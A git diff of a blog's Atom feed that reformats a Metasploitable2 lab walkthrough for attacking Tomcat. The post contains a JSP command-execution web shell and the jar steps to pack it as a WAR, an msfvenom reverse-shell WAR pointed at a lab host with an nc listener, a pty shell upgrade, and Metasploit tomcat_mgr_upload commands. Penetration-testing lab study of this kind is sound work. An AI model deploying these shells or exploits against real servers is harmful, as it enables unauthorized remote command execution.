@@ -4,7 +4,7 @@
   <title><![CDATA[Category: metasploit | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/metasploit/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-27T16:32:58-05:00</updated>
+  <updated>2016-06-27T16:36:28-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -378,10 +378,11 @@ msf auxiliary(mysql_login) &gt; run
 
 <p>same shit, generate upload WAR reverse shell backdoor.</p>
 
-<p>create webshell(from pentester lab, you may generate it using msfvenom)</p>
+<p>create webshell called index.jsp (from pentester lab, you may generate it using msfvenom)</p>
 
-<p>```jsp  index.jsp
-<FORM METHOD=GET ACTION='index.jsp'>
+<p>```jsp</p>
+
+<p><FORM METHOD=GET ACTION='index.jsp'>
 <INPUT name='cmd' type=text>
 <INPUT type=submit value='Run'>
 </FORM>
@@ -411,41 +412,36 @@ now pack the webshell
 cp index.jsp webshell</p>
 
 <p>cd webshell
-jar -cvf ../webshell.war *</p>
-
-<pre><code>
-
-deploy it and visit http://192.168.79.179:8180/webshell/index.jsp?
-
-<img src="/images/blog/misc/metasploitable2/Selection_015.png" title="[title manually exploit [alt text]]" >
-
-use msfvenom to create webshell:
-
-`msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.79.173 lport=4444 -f war &gt; webshell1.war`
-
-setup nc in kali, deploy it and visit http://192.168.79.179:8180/webshell1/
-
-
-After connection, get the shell:
-
-`python -c 'import pty; pty.spawn("/bin/bash")'`
-
-
-<img src="/images/blog/misc/metasploitable2/Selection_016.png" title="[title manually exploit [alt text]]" >
-
-
-Use Metasploit:
-
-`msf &gt; search tomcat`
-
-<img src="/images/blog/misc/metasploitable2/Selection_017.png" title="[title manually exploit [alt text]]" >
-</code></pre>
-
-<p>msf > use exploit/multi/http/tomcat_mgr_upload
-msf exploit(tomcat_mgr_upload) > set rhost 192.168.79.179
-msf exploit(tomcat_mgr_upload) > set rport 8180
-msf exploit(tomcat_mgr_upload) > exploit
+jar -cvf ../webshell.war *
 ```</p>
+
+<p>deploy it and visit <a href="http://192.168.79.179:8180/webshell/index.jsp?">http://192.168.79.179:8180/webshell/index.jsp?</a></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use msfvenom to create webshell:</p>
+
+<p><code>msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.79.173 lport=4444 -f war &gt; webshell1.war</code></p>
+
+<p>setup nc in kali, deploy it and visit <a href="http://192.168.79.179:8180/webshell1/">http://192.168.79.179:8180/webshell1/</a></p>
+
+<p>After connection, get the shell:</p>
+
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Use Metasploit:</p>
+
+<p><code>msf &gt; search tomcat</code></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<pre><code>msf &gt; use exploit/multi/http/tomcat_mgr_upload
+msf exploit(tomcat_mgr_upload) &gt; set rhost 192.168.79.179
+msf exploit(tomcat_mgr_upload) &gt; set rport 8180
+msf exploit(tomcat_mgr_upload) &gt; exploit
+</code></pre>
 
 <p><img src="/images/blog/misc/metasploitable2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
